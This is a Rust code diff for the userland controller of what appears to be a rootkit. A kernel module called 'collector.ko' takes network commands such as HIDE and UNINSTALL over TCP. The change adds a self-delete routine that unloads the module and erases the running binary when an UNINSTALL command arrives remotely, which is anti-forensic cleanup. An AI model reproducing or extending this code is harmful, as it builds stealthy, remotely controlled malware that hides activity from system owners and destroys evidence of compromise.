@@ -2,7 +2,9 @@ extern crate protobuf;
 extern crate collector;
 mod kernel;
 
+use std::fs;
 use std::thread;
+use std::process::Command;
 use std::net::{TcpListener, TcpStream};
 use protobuf::Message;
 use structopt::StructOpt;
@@ -26,7 +28,26 @@ fn to_response_result(result: kernel::CommandExecResult) -> response::Response_R
     };
 }
 
-fn exec_command(command: &commands::Command) -> response::Response_Result {
+fn self_delete() {
+    if Command::new("rmmod").arg("collector.ko").status().is_err() {
+        eprintln!("Failed to unload module");
+    }
+
+    let bin_path = std::env::current_exe().unwrap();
+    if fs::remove_file(bin_path.as_path()).is_err() {
+        eprintln!("Failed to delete binary");
+    }
+}
+
+fn send_response(mut stream: &TcpStream, result: response::Response_Result) {
+    println!("Send response: {:?}", result);
+
+    let mut response = response::Response::new();
+    response.set_result(result);
+    common::send_message(&mut stream, &response);
+}
+
+fn handle_command(command: commands::Command, mut stream: TcpStream) {
     let res = match command.get_command_type() {
         commands::Command_Type::HIDE =>
             kernel::exec_command(
@@ -40,34 +61,38 @@ fn exec_command(command: &commands::Command) -> response::Response_Result {
             kernel::exec_command(kernel::Command::Uninstall, None)
     };
 
-    if res.is_err(){
-        println!("Failed to exec command: {}", res.unwrap_err());
-        return response::Response_Result::ERROR_MODULE_COMMUNICATION;
-    }
+    let response = match res {
+        Ok(res) => to_response_result(res),
+        Err(e) => {
+            eprintln!("Failed to exec command: {}", e);
+            response::Response_Result::ERROR_MODULE_COMMUNICATION
+        }
+    };
 
-    return to_response_result(res.unwrap());
+    send_response(&mut stream, response);
 }
 
-fn send_response(mut stream: &TcpStream, result: response::Response_Result) {
-    println!("Send response: {:?}", result);
-
-    let mut response = response::Response::new();
-    response.set_result(result);
-    common::send_message(&mut stream, &response);
-}
-
-fn handle_server_request(mut stream: TcpStream) {
+fn handle_connection(mut stream: TcpStream) -> bool {
     println!("New connection: {}", stream.peer_addr().unwrap());
-
     let command = match commands::Command::parse_from_reader(&mut stream){
         Ok(command) => command,
         Err(e) => {
             eprintln!("Failed to parse message: {}", e);
-            return;
+            return true;
         }
     };
 
-    send_response(&mut stream, exec_command(&command));
+    if command.get_command_type() == commands::Command_Type::UNINSTALL {
+        self_delete();
+        send_response(&mut stream, response::Response_Result::OK);
+        return false;
+    }
+
+    thread::spawn(move || {
+        handle_command(command, stream)
+    });
+
+    return true;
 }
 
 fn main() {
@@ -85,12 +110,12 @@ fn main() {
     for stream in listener.incoming() {
         match stream {
             Ok(stream) => {
-                thread::spawn(move || {
-                    handle_server_request(stream)
-                });
+                if !handle_connection(stream){
+                    break;
+                }
             }
             Err(e) => {
-                println!("Error: {}", e);
+                eprintln!("Error: {}", e);
             }
         }
     }
